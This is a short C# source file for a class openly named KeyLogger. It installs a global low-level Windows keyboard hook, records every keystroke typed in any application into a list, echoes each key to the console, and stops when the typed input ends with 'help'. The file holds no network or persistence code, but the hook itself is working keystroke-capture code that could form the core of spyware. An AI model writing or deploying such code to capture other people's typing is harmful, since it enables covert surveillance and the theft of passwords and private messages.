using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyLogger {
    private static IntPtr hookId = IntPtr.Zero;
    private static LowLevelKeyboardProc proc = HookCallback;
    private static List<string> keyPresses = new List<string>();
    private static string currentInput = "";

    public static void Start() {
        hookId = SetHook(proc);
        Application.Run();
        UnhookWindowsHookEx(hookId);
    }

    public static void Stop() {
        Application.Exit();
    }

    public static string[] GetKeyPresses() {
        return keyPresses.ToArray();
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
            int vkCode = Marshal.ReadInt32(lParam);
            string key = ((Keys)vkCode).ToString();
            Console.WriteLine(key);
            keyPresses.Add(key);
            currentInput += key.ToLower();
            if (currentInput.EndsWith("help")) {
                Stop();
            }
            Console.WriteLine(keyPresses.Count);
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}